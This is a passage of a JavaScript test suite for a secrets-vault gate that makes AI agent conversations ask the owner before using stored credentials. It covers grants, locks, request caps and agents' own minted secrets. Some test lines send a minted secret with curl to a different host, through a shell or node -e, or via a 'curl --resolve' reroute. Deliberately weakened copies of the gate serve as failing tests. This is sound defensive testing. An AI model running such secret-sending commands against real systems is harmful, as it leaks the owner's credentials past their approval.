  ok(d4.outcome === 'denied' && i4.resolvedBy === 'denied' && st4 && /^denied by you · /.test(st4.text) && w.door.answerRequest(q4.askId, { answer: 'once', reauthed: true }).code === 'ask_settled' && !w.door._grants.size, 'its own Deny ends it — «denied by you · HH:MM»; a late answer is ask_settled', { by: i4.resolvedBy, stamp: st4 && st4.text });
  const q5 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  const i5 = reqsOf()[0]; const held5 = w.userTodos._state.items.find((x) => x.id === i5.id); held5.detail = held5.detail.replace('nightly', 'Nightly');
  const a5 = w.door.answerRequest(q5.askId, { answer: 'once', reauthed: true });
  ok(q5.ok && a5.code === 'ask_changed' && !w.door._grants.size, 'a request whose item changed after it was shown ⇒ ask_changed, nothing granted (the belt)', a5);
  const q6 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  if (q6.ok) { w.gone.add('conv-1'); const a6 = w.door.answerRequest(q6.askId, { answer: 'once', reauthed: true }); w.gone.delete('conv-1'); ok(a6.code === 'conversation_gone' && !w.door._grants.size, 'the conversation that asked has ended ⇒ conversation_gone, nothing granted', a6); }
  // THE LOCK: an open request withdrawn vault_locked, every grant ended
  w.door._reqQuiet.clear();
  const q7 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  const q8 = w.door.request({ caller, entry: 'vault://app-secrets/app1/item.0.1', purpose: 'log in to the app' });
  const i8id = (reqsOf().find((x) => x.action.askId === q8.askId) || {}).id;
  w.door.answerRequest(q8.askId, { answer: '8h', reauthed: true });
  const i7 = reqsOf()[0];
  w.vault.lock('agent');
  const after = w.userTodos.get(i7.id);
  ok(q7.ok && after && after.status === 'done' && after.resolvedBy === 'vault_locked' && !w.door._requests.size && !w.door._grants.size, 'A LOCK withdraws every open request (its item resolved by vault_locked) and ends every grant', after && [after.status, after.resolvedBy]);
  { const i8 = w.userTodos.get(i8id), s8 = i8 && FA.decidedStamp(i8); ok(i8 && i8.resolvedFact?.endedBy === 'lock' && s8 && /^allowed for 8 hours · ended (\d+\/\d+ )?\d\d:\d\d$/.test(s8.text) && FA.decisionCard(i8).state === 'ended', 'r6: …and each grant\'s RECORD says so: the 8-hour grant locked ⇒ «allowed for 8 hours · ended HH:MM» at once (was: «allowed for 8 h» after the lock)', { fact: i8 && i8.resolvedFact, stamp: s8 && s8.text }); }
  await w.vault.unlock(PW);
  const r9 = await w.door.run({ caller, args: ['--env', 'T=vault://app-secrets/app1/item.0.1', '--', NODE, PRINTER, 'env'], cwd: w.work });
  ok(r9.code === 'grant_expired' && /a lock of the vault ended it at \d{4}-\d\d-\d\d \d\d:\d\d UTC/.test(r9.words || ''), 'after the unlock the 8-hour grant is gone — the entry is closed again, and the run says the LOCK ended its approval (B-a14b)', r9);
  { // r6: A RESTART ENDS EVERY GRANT (the grant rows are memory; the vault locks at each start) — a record still reading live says so
    const qR = w.door.request({ caller, entry: M1, purpose: PURPOSE });
    const iRid = (reqsOf().find((x) => x.action.askId === qR.askId) || {}).id;
    w.door.answerRequest(qR.askId, { answer: '8h', reauthed: true, person: true });
    const live0 = FA.decisionCard(w.userTodos.get(iRid)).state;
    w.mk();   // a new door over the same For-you store — the hub's next start
    const iR = w.userTodos.get(iRid), sR = FA.decidedStamp(iR);
    ok(live0 === 'approved' && iR.resolvedFact?.endedBy === 'restart' && sR && /^allowed for 8 hours · ended /.test(sR.text), 'r6: a hub restart inside the 8 hours ⇒ the next start writes the grant\'s end on its record («allowed for 8 hours · ended HH:MM» — the grant rows were memory)', { live0, fact: iR.resolvedFact, stamp: sR && sR.text });
  }
  { // r6 (主开发: «an answer never carries a value an old reader cannot name»): what THIS door answers and records, read by the OLD
    // clients — the production .357 client (fbaf6988 src/lib/user-todos-actions.js L393, its tray: no word for any grant — the raw
    // value) and 4b8896e7's (its toast L409 and src/lib/user-todos-row.js L94–95), copied here as fixtures (CI has no history)
    const OLD_TOAST = { '.357 (fbaf6988)': (r, t) => (r.outcome === 'granted' ? t('Granted for 8 hours — a lock ends it') : r.outcome === 'granted-once' ? t('Granted for its next run') : t('denied')),
      '4b8896e7': (r, t) => (r.outcome === 'granted' ? t('Granted for 8 hours — a lock ends it') : r.outcome === 'granted-once' ? t('Granted for its next run') : t('denied')) };
    const OLD_TRAY = { '.357 (fbaf6988)': (by) => by, '4b8896e7': (by) => (by === 'granted' ? 'allowed for 8 hours' : by === 'granted-once' ? 'allowed once' : by) };
    const wo = await world();   // a fresh hub (the legs above left grants and quiet pairs behind)
    const reqsO = () => (wo.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === 'vault-grant-ask');
    const cO = { ...wo.caller, scope: 'webui-1' }, cO2 = { ...cO, conversationId: 'conv-9', sessionKey: 'claude:conv-9', name: 'Lane Nine', scope: 'webui-9' };
    const qO = wo.door.request({ caller: cO, entry: M1, purpose: PURPOSE }), iOid = (reqsO().find((x) => x.action.askId === qO.askId) || {}).id;
    const aO = wo.door.answerRequest(qO.askId, { answer: 'once', reauthed: true, person: true });
    const q8b = wo.door.request({ caller: cO2, entry: M1, purpose: PURPOSE }), i8bid = (reqsO().find((x) => x.action.askId === q8b.askId) || {}).id;
    const a8b = wo.door.answerRequest(q8b.askId, { answer: '8h', reauthed: true, person: true });
    const tt = (x) => x;
    const byOf = (id) => (wo.userTodos.get(id) || {}).resolvedBy;
    const seen = Object.fromEntries(Object.keys(OLD_TOAST).map((k) => [k, { toastOnce: OLD_TOAST[k](aO, tt), toast8h: OLD_TOAST[k](a8b, tt), trayOnce: OLD_TRAY[k](byOf(iOid)), tray8h: OLD_TRAY[k](byOf(i8bid)) }]));
    const old4 = seen['4b8896e7'], old357 = seen['.357 (fbaf6988)'];
    ok(aO.ok && a8b.ok && Object.values(seen).every((v) => v.toastOnce !== 'denied' && v.toast8h !== 'denied') && old357.toastOnce === 'Granted for its next run' && old357.toast8h === 'Granted for 8 hours — a lock ends it' && /allowed/.test(old4.trayOnce) && /allowed/.test(old4.tray8h) && old357.tray8h === 'granted', `r6: the OLD clients read this door's answers and records — no «denied» for a grant (was: «denied» for a successful For 8 hours), the old tray «allowed…» (4b8896e7) / the raw \`granted\` the .357 tray always showed (was: raw \`granted-8h\`) — the new reader says the duration from \`grantedFor\``, seen);
    ok(aO.grantedFor === 'once' && a8b.grantedFor === '8h' && ((wo.userTodos.get(i8bid) || {}).resolvedFact || {}).grantedFor === '8h', 'r6: the duration is ADDITIVE — the answer\'s and the record\'s `grantedFor` (once / 8h)', { aO, a8b });
  }
  const lockedReq = (w.vault.lock('agent'), w.door.request({ caller, entry: M1, purpose: PURPOSE }));
  ok(lockedReq.code === 'vault_locked' && /already been told/.test(lockedReq.words) && w.vault.blockedSummary().actors.some((a) => a.verbs.includes('vibespace-vault request')), 'a LOCKED vault refuses a request first (the told words) and notes who it stopped', lockedReq);
  await w.vault.unlock(PW);
  // THE REVIEW'S USE-LINE LEGS: one receipt for every entry of a refused run; a child that RAN is a use whatever ended it;
  // the owner's silence / the hub's tray / the agent's own cancel never count toward the daily-failure card
  const two = await w.door.run({ caller, args: ['--env', 'A=vault://app-secrets/app1/item.0.1', '--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'env'], cwd: w.work });
  const twoLines = w.door.usesFor(caller).uses.slice(0, 2);
  ok(two.code === 'grant_expired' && twoLines.length === 2 && twoLines.every((u) => u.outcome === 'grant_expired' && /^vr-[0-9a-f]{16}$/.test(u.receipt)) && twoLines[0].receipt === twoLines[1].receipt && !JSON.stringify(two).includes('vr-'),
    'a refused run naming two entries: one use line each, ONE receipt between them (the audit\'s — never in the refused answer)', twoLines);
  openRow(w);
  const ac = new AbortController(), pidF = path.join(w.work, 'gone.pid');
  const pg = w.door.run({ caller, args: ['--env', 'T=vault://mounts/m1/secretKey', '--', NODE, PRINTER, 'sleep', pidF], cwd: w.work, signal: ac.signal });
  const c0 = await waitCard(w); if (c0) w.door.answer(c0.action.askId, { answer: 'once' });
  for (let k = 0; k < 300 && !fs.existsSync(pidF); k++) await sleep(10);
  ac.abort();
  const rg = await pg;
  const goneUse = w.door.usesFor(caller).uses[0];
  ok(rg.code === 'caller_gone' && goneUse && goneUse.outcome === 'caller_gone' && goneUse.door === 'run' && /^vr-/.test(goneUse.receipt), 'a run whose child RAN with the value and whose caller went away is still a use line (caller_gone, its receipt)', goneUse);
  w.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });
  const VU = R('src/vault-use.js');
  ok(['ask_expired', 'ask_unfiled', 'caller_gone', 'vault_locked'].every((c) => !VU.counts(c)) && ['ask_denied', 'entry_not_runnable', 'use_not_granted'].every((c) => VU.counts(c)), 'the daily-failure count: the owner\'s silence, the hub\'s tray, the agent\'s own cancel and the lock never count; a refusal that IS the actor\'s (denied, closed, not granted) does');
  // the agent's OWN entry: its conversation may ask for it (the mint's scope = the use law's conv)
  const qa = w.door.request({ caller: { ...caller, conversationId: 'conv-x', scope: 'conv-1' }, entry: 'vault://agent:conv-1/gh-token', purpose: 'push the release tag' });
  ok(qa.ok, 'an agent may ask for its OWN minted entry (scope = the use law\'s conv, as vault-mint-put spells it)', qa);
  // a previous process's request: reconcile resolves it (the hub forgot it — and a restart locks the vault anyway)
  const w2 = await world();
  const d1 = w2.mk(); const qx = d1.request({ caller, entry: M1, purpose: PURPOSE });
  const d2 = w2.mk();
  ok(qx.ok && d2.reconcile() >= 1 && !(w2.userTodos.snapshot().open || []).some((x) => x.action && x.action.type === 'vault-grant-ask'), 'boot: a request a previous process filed is resolved (reconcile) — it can never be answered');
  const bounded = []; for (let k = 0; k < 9; k++) bounded.push(w2.door.request({ caller: { ...caller, scope: 'webui-b' }, entry: k < 3 ? ['vault://mounts/m1/secretKey', 'vault://mounts/m2/secretKey', 'vault://app-secrets/app1/item.0.1'][k] : 'vault://mounts/m1/secretKey', purpose: 'p' + k }).code || 'ok');
  ok(bounded.filter((c) => c === 'ok').length === 3 && bounded.slice(3).every((c) => c === 'request_pending'), 'one open request per conversation × entry — each further one for an entry already asked ⇒ request_pending', bounded);
  // the card on the page
  const L = await import(pathToFileURL(path.join(REPO, 'src/lib/inbox-window-layout.js')).href);
  const view = L.itemView({ id: 'ut-r', sessionKey: 'claude:conv-1', text: 'Lane X asks to use a stored secret', detail: 'Secret: my bucket — ' + M1, urgency: 'high', kind: 'action', status: 'open', createdAt: 1, options: null, reply: null,
    action: { type: 'vault-grant-ask', askId: 'b'.repeat(32) } }, { t: (x) => x, words: 'w', detail: 'd', name: 'Lane X', origin: { origin: 'vault', label: 'Vault' }, notice: false, reply: { show: false }, ago: () => '', expires: () => '', resolvedBy: () => '' });
  ok(view.actions.slice(0, 3).join() === 'hub-once,grant-8h,hub-deny' && !view.actions.includes('reply'), 'the For-you window: Allow once / For 8 hours / Deny first — no reply box', view.actions);
  const read = (rel) => fs.readFileSync(path.join(REPO, rel), 'utf8');
  ok(/const GRANT_ANSWERS = \['once', '8h', 'deny'\];/.test(read('src/lib/user-todos-row.js')) && /a === '8h' \? t\('For 8 hours'\)/.test(read('src/lib/user-todos-row.js')) && /a === 'grant-8h' \? '8h'/.test(read('src/lib/inbox-window.js'))
    && /\/api\/vault\/request\/asks\//.test(read('src/lib/user-todos-actions.js')) && R('src/inbox-reply.js').ANSWER_ACTION_TYPES.includes('vault-grant-ask') && /\{ type: 'vault-grant-ask', identity: 'askId',/.test(read('src/foryou-actions.js')), 'the popup row and the window answer once / 8h / deny through POST /api/vault/request/asks/:askId; a typed reply never answers it; one item per request (THE For-you action registry\'s row)');
}

console.log('⑩b THE CAP\'S SHAPE (B-4934, q-043 verify L2): 8 open asks per conversation; hub-wide a count of CONVERSATIONS (32); «N conversations are asking»');
{
  const CAP_ROWS = Array.from({ length: 9 }, (_, k) => ({ entry: `cap${k}`, field: 'secretKey', label: `bucket ${k}`, cipher: 'x'.repeat(60), v: VALUE }));
  ROWS.mounts.push(...CAP_ROWS);
  try {
    const capRef = (k) => `vault://mounts/cap${k}/secretKey`;
    const conv = (k, w) => ({ conversationId: `conv-c${k}`, sessionKey: `claude:conv-c${k}`, name: `Lane C${k}`, cwd: w.work, scope: `webui-c${k}` });
    /** eight conversations × 8 open asks (the table the old 64-request cap called full), then a NINTH conversation's first */
    const capLeg = async (doorMod) => {
      const w = await world({ doorMod });
      const eight = []; for (let k = 0; k < 8; k++) for (let j = 0; j < 8; j++) eight.push(w.door.request({ caller: conv(k, w), entry: capRef(j), purpose: `job ${j}` }));
      return { w, eight, ninth: w.door.request({ caller: conv(8, w), entry: capRef(0), purpose: 'my first ask' }) };
    };
    const { w, eight, ninth } = await capLeg(DOOR);
    ok(eight.every((r) => r.ok) && ninth.ok && w.door._requests.size === 65, 'eight conversations × 8 open asks (64), then a NINTH conversation\'s first ask is FILED — never refused for the other conversations\' asks', [eight.filter((r) => !r.ok).map((r) => r.code), ninth.code]);
    const SRC = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
    const NEW_CAP = "if (!askers.has(scope) && askers.size >= REQUEST_CALLERS_MAX) return named('too_many_askers');";
    const mOld = SRC.split(NEW_CAP).length === 2 ? M.load('src/server/vault-run-door.js', editAnchor(SRC, NEW_CAP, "if (requests.size >= 64) return named('too_many_requests');", "src/server/vault-run-door.js"), 'oldcap') : null;
    const old = mOld ? await capLeg(mOld) : null;
    ok(old && old.eight.every((r) => r.ok) && old.ninth.code === 'too_many_requests', 'MUTANT «the hub-wide bound counts REQUESTS (64)» — the pre-fix shape: the ninth conversation\'s first ask is refused too_many_requests ⇒ RED; the shipped door files it', old && old.ninth);
    const over = w.door.request({ caller: conv(0, w), entry: capRef(8), purpose: 'one more' });
    ok(over.code === 'too_many_requests' && over.words === DOOR.MORE_WORDS.too_many_requests && /this conversation already has 8 questions waiting/.test(over.words) && DOOR.statusOf(over.code) === 429 && w.door._requests.size === 65,
      'the PER-CONVERSATION cap holds: one conversation\'s 9th open ask ⇒ too_many_requests BY NAME (429; the words name ITS 8 and `vibespace-vault uses`)', over);
    // THE TRAY LINE: more than 8 conversations asking ⇒ ONE Vault notice, its count in its words
    const lineOf = () => (w.userTodos.snapshot().open || []).filter((i) => i.sessionKey === 'vault' && i.text === DOOR.ASKING_TEXT);
    const L9 = lineOf();
    ok(L9.length === 1 && L9[0].origin === 'vault' && L9[0].kind === 'notice' && !L9[0].action && L9[0].i18n.text.key === '{n} conversations are asking to use stored secrets' && L9[0].i18n.text.params.n === 9,
      'NINE conversations asking (more than 8) ⇒ ONE Vault notice in the owner\'s For you «9 conversations are asking to use stored secrets» — a notice (each ask is its own card)', L9);
    const id9 = L9[0] && L9[0].id;
    const t10 = w.door.request({ caller: conv(9, w), entry: capRef(0), purpose: 'p' });
    const L10 = lineOf();
    ok(t10.ok && L10.length === 1 && L10[0].id === id9 && L10[0].i18n.text.params.n === 10, 'a tenth conversation ⇒ the SAME row says 10 (re-worded in place — never a second row)', L10.map((i) => [i.id, i.i18n.text.params.n]));
    const idsOf = (k) => [...w.door._requests.values()].filter((q) => q.scope === `webui-c${k}`).map((q) => q.askId);
    for (const a of idsOf(9)) w.door.answerRequest(a, { answer: 'deny' });
    ok(lineOf().length === 1 && lineOf()[0].id === id9 && lineOf()[0].i18n.text.params.n === 9, 'an answer lowers it (10 → 9)', lineOf().map((i) => i.i18n.text.params.n));
    for (const a of idsOf(8)) w.door.answerRequest(a, { answer: 'deny' });
    const closed = w.userTodos.get(id9);
    ok(!lineOf().length && closed.status === 'done' && closed.resolvedBy === 'vault', '8 or fewer asking ⇒ the line is closed (by the vault, not the owner)', closed && [closed.status, closed.resolvedBy]);
    // THE HUB-WIDE BOUND counts CONVERSATIONS: 32 asking ⇒ the 33rd refused BY NAME; one already asking still asks
    w.door._reqQuiet.clear();   // (the denies above quieted conv-c8 / c9 × cap0)
    const more = []; for (let k = 8; k < 32; k++) more.push(w.door.request({ caller: conv(k, w), entry: capRef(0), purpose: 'p' }));
    const n33 = w.door.request({ caller: conv(32, w), entry: capRef(0), purpose: 'p' });
    const again31 = w.door.request({ caller: conv(31, w), entry: capRef(1), purpose: 'p' });
    ok(more.every((r) => r.ok) && n33.code === 'too_many_askers' && n33.words === DOOR.MORE_WORDS.too_many_askers && /^32 other conversations are waiting on the user's answers already — nothing was filed/.test(n33.words) && DOOR.statusOf('too_many_askers') === 429 && again31.ok,
      '32 conversations asking at once ⇒ the 33rd is refused too_many_askers BY NAME (429; nothing filed) while a conversation ALREADY asking still asks (the bound counts conversations, never requests)', [more.filter((r) => !r.ok).map((r) => r.code), n33, again31.code]);
    ok(lineOf().length === 1 && lineOf()[0].i18n.text.params.n === 32 && !(w.userTodos.snapshot().open || []).some((i) => i.sessionKey === 'claude:conv-c32'), 'the line says 32; the refused 33rd filed nothing', lineOf().map((i) => i.i18n.text.params.n));
    // SET ASIDE by the owner ⇒ quiet while the count moves
    const id32 = lineOf()[0].id;
    w.userTodos.setStatus(id32, 'dismissed', 'user');
    for (const a of idsOf(31)) w.door.answerRequest(a, { answer: 'deny' });
    ok(w.userTodos.get(id32).status === 'dismissed' && !lineOf().length, 'the owner dismissed the line ⇒ it stays dismissed while the count moves (32 → 31) — never reopened under their pointer');
    w.vault.lock('agent');
    ok(!w.door._requests.size && !lineOf().length, 'a LOCK withdraws every request; no line');
    await w.vault.unlock(PW);
    // a NEW episode files it again; a LOCK with the line open closes it; a BOOT closes a previous process's
    for (let k = 0; k < 9; k++) w.door.request({ caller: conv(k, w), entry: capRef(0), purpose: 'p' });
    const ep2 = lineOf();
    ok(ep2.length === 1 && ep2[0].i18n.text.params.n === 9, 'a new episode (nine asking after the lock) ⇒ the line again', ep2.map((i) => [i.status, i.i18n.text.params.n]));
    w.vault.lock('agent');
    const atLock = ep2[0] && w.userTodos.get(ep2[0].id);
    ok(atLock && atLock.status === 'done' && atLock.resolvedBy === 'vault' && !lineOf().length, 'a LOCK with the line open closes it (by the vault — one recount after the whole withdrawal)', atLock && [atLock.status, atLock.resolvedBy]);
    await w.vault.unlock(PW);
    for (let k = 0; k < 9; k++) w.door.request({ caller: conv(k, w), entry: capRef(0), purpose: 'p' });
    const before = lineOf().length;
    w.mk().reconcile();
    ok(before === 1 && !lineOf().length, 'a BOOT (reconcile): a line a previous process filed is closed — its requests died with it', before);
  } finally { ROWS.mounts.splice(-CAP_ROWS.length); }
}

console.log('⑪ THE OWN ROAD (lane vault-agent-own) — what an agent stored itself is its own to use; a minted value asks once per other host');
{
  const w = await world({ instance: 'cluster', killGraceMs: 400 });   // a cluster asks EVERY run of anything else: «no card» here is the own road's
  const OWN = 'vault://agent:conv-1/gh-token', MINT = 'vault://agent:conv-1/site-pw', OWN_V = 'agent-minted-value-0123456789', MINT_V = 'agent-minted-pw-0123456789abc';
  const usesOf = () => w.door.usesFor({ ...w.caller, scope: 'conv-1' }).uses || [];
  // STORED: no switch, no grant, no card — scrubbed, audited (allowedBy own), a use line with the receipt
  const r1 = await w.door.run({ caller: w.caller, args: ['--env', `T=${OWN}`, '--', NODE, PRINTER, 'env'], cwd: w.work });
  const line1 = runLines(w).filter((x) => x.outcome === 'ran').pop(), use1 = usesOf()[0];
  ok(r1.ok && r1.by === 'own' && !cardsOf(w).length && !leaks(r1.stdout + r1.stderr, OWN_V).length && /\[vault:agent:conv-1\/gh-token\]/.test(r1.stdout), 'its own STORED entry: no switch, no grant, NO CARD on a cluster — the output scrubbed to its placeholder', [r1.code || r1.by, cardsOf(w).length]);
  ok(!!line1 && line1.allowedBy === 'own' && line1.entries[0] === OWN && line1.receipt === r1.receipt && !!use1 && use1.door === 'run' && use1.outcome === 'ok' && use1.receipt === r1.receipt && use1.entry === OWN, 'still a use: its run line says allowedBy own, its use line (door run, ok) carries the run\'s receipt — `vibespace-vault uses` lists it', [line1 && line1.allowedBy, use1]);
  const sh = await w.door.run({ caller: w.caller, args: ['--env', `T=${OWN}`, '--', '/bin/sh', '-c', 'echo "$T"'], cwd: w.work });
  ok(sh.ok && sh.by === 'own' && !cardsOf(w).length && !leaks(sh.stdout, OWN_V).length, 'a shell too (a shell\'s whole command is its shape — still no card for its own stored value; the scrubber still reads the output)', sh.code || sh.by);
  const pr = await w.door.run({ caller: w.caller, args: ['--env', `T=${OWN}`, '--', 'cat', '$VAULT_FILE{T}'], cwd: w.work });
  ok(pr.code === 'tool_prints_secrets', 'the refusal tables still hold for its own entry: a printing tool is refused by name', pr.code);
  // WHOSE: a resumed conversation keeps it (its durable id); a pending fork and another conversation are refused by name
  const resumed = { ...w.caller, scope: 'sess-77-1', conv: 'conv-1', conversationId: 'conv-1' };
  const r2 = await w.door.run({ caller: resumed, args: ['--env', `T=${OWN}`, '--', NODE, PRINTER, 'env'], cwd: w.work });
  ok(r2.ok && r2.by === 'own', 'a conversation that ended and came back (a new registered id, its durable id kept) runs its own entry — no card', r2.code || r2.by);
  const fork = await w.door.run({ caller: { ...w.caller, scope: 'sess-78-1', conv: null, conversationId: 'conv-1' }, args: ['--env', `T=${OWN}`, '--', NODE, PRINTER, 'env'], cwd: w.work });
  const other = await w.door.run({ caller: { ...w.caller, conversationId: 'conv-2', sessionKey: 'claude:conv-2', name: 'Lane Y', scope: 'sess-79-1', conv: 'conv-2' }, args: ['--env', `T=${OWN}`, '--', NODE, PRINTER, 'env'], cwd: w.work });
  ok(fork.code === 'use_not_granted' && other.code === 'use_not_granted' && !cardsOf(w).length, 'a pending fork (it borrows its parent\'s id: conv null) and another conversation ⇒ use_not_granted by name — no card, nothing read', [fork.code, other.code]);
  // MINTED --for api.example.com: its host and no host ⇒ no card; another host ⇒ ONE card naming both; once allowed, that host is passed
  const m1 = await w.door.run({ caller: w.caller, args: ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://api.example.com/v1/login'], cwd: w.work });
  ok(m1.ok && m1.by === 'own' && !cardsOf(w).length && !leaks(m1.stdout, MINT_V).length, 'its own MINTED entry to the host it was minted for ⇒ no card', m1.code || m1.by);
  // ROUND 2: a known tool naming no host it can READ is not a local command (every tool of the table reaches the network)
  const m0 = await runAnswered(w, ['--env', `T=${MINT}`, '--', 'curl', '-s'], { answer: 'deny' });
  ok(!!m0.card && m0.r.code === 'ask_denied' && /Why it asks: where this command sends it cannot be told \(.*a host it does not read/.test(m0.card.detail || ''), 'its MINTED value in a known tool naming no host it can read (curl -s) ⇒ the card (where it goes cannot be told) — denied, nothing ran', m0.r.code);
  const away = await runAnswered(w, ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://elsewhere.example.net/x'], { answer: 'once' });
  const d = (away.card && away.card.detail) || '';
  ok(!!away.card && away.r.ok && away.r.by === 'once' && away.card.action.always === false && /Stored by: vault:\/\/agent:conv-1\/site-pw — this conversation \(the hub minted it for api\.example\.com/.test(d) && /Why it asks: it would go to another host — vault:\/\/agent:conv-1\/site-pw was minted for api\.example\.com, this run sends it to elsewhere\.example\.net/.test(d) && !d.includes(MINT_V),
    'to ANOTHER host ⇒ ONE card: who stored it and why it asks, BOTH hosts named, no «always» (a host at a time) — allowed once, it ran', { card: !!away.card, by: away.r.by, always: away.card && away.card.action.always, detail: d.split('\n').filter((l) => /^(Stored by|Why it asks)/.test(l)) });
  const again = await w.door.run({ caller: w.caller, args: ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://elsewhere.example.net/other'], cwd: w.work });
  ok(again.ok && again.by === 'own' && !cardsOf(w).length, 'ONCE per host: the same host again ⇒ no card (the 允许 was that host\'s pass for this entry)', again.code || again.by);
  const third = await runAnswered(w, ['--env', `T=${MINT}`, '--', 'curl', '-s', 'https://third.example.org/'], { answer: 'deny' });
  ok(!!third.card && third.r.code === 'ask_denied', 'a THIRD host asks again — denied, nothing ran', third.r.code);
  // THE REVIEW + ROUND 2: through a shell or an interpreter its destination cannot be told — even naming its own host — ⇒ on a
  // CLUSTER the card EVERY run (one plain 允许 is never kept there: the owner's own entries ask every run too)
  const shellArgs = ['--env', `T=${MINT}`, '--', '/bin/sh', '-c', 'curl -s https://api.example.com/v1/login'];
  const blind1 = await runAnswered(w, shellArgs, { answer: 'once' });
  const bd = (blind1.card && blind1.card.detail) || '';
  const blind2 = await runAnswered(w, shellArgs, { answer: 'deny' });
  ok(!!blind1.card && blind1.r.ok && !leaks(blind1.r.stdout || '', MINT_V).length && /Why it asks: where this command sends it cannot be told/.test(bd) && /on this shared instance every run of it asks again/.test(bd) && blind1.card.action.always === false && !!blind2.card && blind2.r.code === 'ask_denied',
    'its MINTED value through a SHELL on a cluster (where it goes cannot be told, even naming its own host) ⇒ the card; allowed once it ran — and the SAME shape asks AGAIN (a cluster keeps no shape pass)', { card: !!blind1.card, second: blind2.r.code, why: bd.split('\n').filter((l) => /^Why/.test(l)) });
  const nodeArgs = ['--env', `T=${MINT}`, '--', NODE, '-e', 'process.stdout.write("node got " + process.env.T + "\\n")'];
  const n1 = await runAnswered(w, nodeArgs, { answer: 'once' }), n2 = await runAnswered(w, nodeArgs, { answer: 'deny' });
  ok(!!n1.card && n1.r.ok && /node got \[vault:agent:conv-1\/site-pw\]/.test(n1.r.stdout || '') && !!n2.card && n2.r.code === 'ask_denied', 'node -e on a cluster: allowed once ⇒ it ran (scrubbed); the NEXT run asks again', [n1.r.code || n1.r.by, n2.r.code]);
  // RED COPY (round 2): a door that reads the LOCAL rule on a cluster — the remember-until-lock this round removed — runs the same node -e again with NO card
  const SRCD = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8'), fromD = 'instance: instanceKind(), policy: policy(), passes: passes(), now: now() });';
  const nD = SRCD.split(fromD).length - 1, modD = nD === 1 ? M.load('src/server/vault-run-door.js', editAnchor(SRCD, fromD, "instance: instanceKind(), policy: 'allow', passes: passes(), now: now() });", "src/server/vault-run-door.js"), 'cluster-keeps') : null;
  const wr = modD ? await world({ instance: 'cluster', doorMod: modD }) : null;
  const rn1 = wr ? await runAnswered(wr, nodeArgs, { answer: 'once' }) : null, rn2 = wr ? await runAnswered(wr, nodeArgs, { answer: 'deny' }) : null;
  ok(nD === 1 && !!rn1 && rn1.r.ok && !!rn2 && !rn2.card && rn2.r.ok, 'RED COPY (round 2): a door reading the local rule on a cluster runs the SAME node -e again with NO card after one plain 允许 — the shipped door asks (above)', { n: nD, second: rn2 && (rn2.r.by || rn2.r.code), card: rn2 && !!rn2.card });
  if (wr) wr.vault.lock('door');
  // round 25 (the vault-use-grants seam ruling): an OPAQUE route (curl --resolve remaps the destination off the named host — a routing flag, `blind`) never offers «always» — the card is once / deny only, and the SAME shape draws its OWN card again (an opaque destination is never a standing pass; vault-use-grants' rule stands at int-C)
  const kyArgs = ['--env', `T=${MINT}`, '--', 'curl', '-s', '--resolve', 'api.example.com:443:127.0.0.1', 'https://api.example.com/v1/login'];
  const k1 = await runAnswered(w, kyArgs, { answer: null });
  const kNoAlways = k1.card ? w.door.answer(k1.card.action.askId, { answer: 'always', ttl: '8h', reauthed: true }) : null;   // «always» is not on offer for an opaque route (even with the second password)
  const k1a = k1.card ? w.door.answer(k1.card.action.askId, { answer: 'once' }) : null;   // once is
  const k1r = await k1.r;
  const k2 = await runAnswered(w, kyArgs, { answer: 'deny' });   // the SAME opaque shape asks AGAIN — no standing pass was minted
  ok(!!k1.card && k1.card.action.always === false && kNoAlways && kNoAlways.code === 'always_not_offered' && k1a && k1a.ok && k1r.ok && k1r.by === 'once' && !!k2.card && k2.card.action.always === false && !leaks(k1r.stdout || '', MINT_V).length,
    'round 25 (the vault-use-grants seam ruling): an OPAQUE route (curl --resolve) never offers «always» — answering «always» is refused always_not_offered, the card is once / deny, the run goes by:once, and the same shape draws its OWN card again (an opaque destination is never a standing pass)', { always: k1.card && k1.card.action.always, kAlways: kNoAlways && kNoAlways.code, by: k1r.by || k1r.code, k2always: k2.card && k2.card.action.always });
  // round 17 (item 1): curl -K whose config is a $VAULT_FILE template the card RENDERS IN FULL ⇒ «always» IS offered (the owner
  // sees the agent's ONLY written input; the pass is keyed on the template bytes, already in the shape key). The owner's router case.
  fs.writeFileSync(path.join(w.work, 'router.cfg'), 'header = "X-API-KEY: $VAULT{agent:conv-1/site-pw}"\nheader = "Accept: application/json"\ninsecure\nsilent\n');
  const uArgs = ['--file', 'CFG=@router.cfg', '--', 'curl', '-s', '-K', '$VAULT_FILE{CFG}', 'https://192.168.1.1/api/v1/integration/sites'];
  const u1 = await runAnswered(w, uArgs, { answer: null });
  const ud = (u1.card && u1.card.detail) || '';
  const uNoPw = u1.card ? w.door.answer(u1.card.action.askId, { answer: 'always', ttl: '30d' }) : null;
  const uYes = u1.card ? w.door.answer(u1.card.action.askId, { answer: 'always', ttl: '30d', reauthed: true }) : null;
  const u1r = await u1.r;
  const u2 = await w.door.run({ caller: w.caller, args: uArgs, cwd: w.work });
  const ust = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
  const urow = (ust.always || []).find((a) => typeof a.templateHash === 'string');
  ok(!!u1.card && u1.card.action.always === true && /Template CFG \(@router\.cfg\):/.test(ud) && /X-API-KEY: \$VAULT\{agent:conv-1\/site-pw\}/.test(ud) && !/«Always» is not offered/.test(ud) && uNoPw && uNoPw.code === 'reveal_needs_password' && uYes && uYes.ok && u1r.ok && u1r.by === 'always' && u2.ok && u2.by === 'always' && !u2.card && !leaks((u1r.stdout || '') + (u2.stdout || ''), MINT_V).length && urow && /^[0-9a-f]{64}$/.test(urow.templateHash) && urow.templateBytes > 0,
